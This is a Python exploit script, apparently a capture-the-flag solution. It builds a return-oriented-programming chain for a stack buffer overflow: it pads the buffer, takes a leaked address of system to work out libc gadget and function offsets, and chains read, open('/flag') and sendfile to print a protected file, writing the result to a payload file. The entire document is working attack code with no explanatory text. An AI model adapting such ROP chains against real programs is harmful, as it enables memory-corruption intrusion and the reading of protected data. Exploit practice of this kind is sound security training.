#!/usr/bin/env python3

from struct import pack

payload = b'a' * 40
addr_diff_rdx_rop = 0xC6F61
addr_diff_rcx_rop = 0x4A412
addr_diff_open = 0xBBA40
addr_diff_sendfile = 0xC0CF0

addr_of_system = int(input("Give me the address of system: "), 16)

# 0x405048 is the address of a global variable.
# read(0, 0x405048, 5);
payload += pack("<Q", 0x402223) # pop rdi ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x402221) # pop rsi ; pop r15 ; ret
payload += pack("<Q", 0x405048) # data
payload += pack("<Q", 0x0)      # meaningless data
payload += pack("<Q", addr_of_system + addr_diff_rdx_rop) # pop rdx ; pop r12 ; ret
payload += pack("<Q", 5)        # data
payload += pack("<Q", 0x0)      # meaningless data
payload += pack("<Q", 0x401090) # <read@plt>

# open("/flag", 0);  // 0 is O_RDONLY.
payload += pack("<Q", 0x402223) # pop rdi ; ret
payload += pack("<Q", 0x405048) # address of string /flag
payload += pack("<Q", 0x402221) # pop rsi ; pop r15 ; ret
payload += pack("<Q", 0x0)      # data
payload += pack("<Q", 0x1)      # meaningless data
payload += pack("<Q", addr_of_system + addr_diff_open) # <__open@@GLIBC_2.2.5>

# sendfile(1, 3, 0, 400);
payload += pack("<Q", 0x402223) # pop rdi ; ret
payload += pack("<Q", 1)        # data
payload += pack("<Q", 0x402221) # pop rsi ; pop r15 ; ret
payload += pack("<Q", 3)        # data
payload += pack("<Q", 0x1)      # meaningless data
payload += pack("<Q", addr_of_system + addr_diff_rdx_rop) # pop rdx ; pop r12 ; ret
payload += pack("<Q", 0)        # data
payload += pack("<Q", 0x0)      # meaningless data
payload += pack("<Q", addr_of_system + addr_diff_rcx_rop) # pop rcx ; ret
payload += pack("<Q", 400)      # data
payload += pack("<Q", addr_of_system + addr_diff_sendfile) # <sendfile@@GLIBC_2.2.5>

with open("payload", "wb") as f:
    f.write(payload)
